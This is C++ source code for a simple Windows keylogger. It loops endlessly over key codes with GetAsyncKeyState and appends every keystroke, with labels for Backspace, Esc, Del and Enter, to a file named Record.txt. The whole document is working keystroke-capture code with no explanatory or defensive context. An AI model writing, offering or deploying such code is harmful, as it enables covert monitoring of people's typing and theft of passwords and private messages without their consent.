#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

void log();

int main()	{
	log();
	return 0;	
}

void log()	{
	char c;
	
	for(;;)	{
		for(c=8;c<=222;c++){
			if (GetAsyncKeyState(c)==-32767)	{
			ofstream write ("Record.txt", ios::app);
			
			switch(c)	{
				case 8:	write<<"<BackSpace>";
						break;
				case 27:	write<<"<Esc>";
							break;
				case 127:	write<<"<Del>";
							break;
				case 32: write<<" ";
						 break;
				case 13:	write<<"<Enter>\n";
							break;
				default:	write<<c;
							break;
			}
			}
		}
	}
}
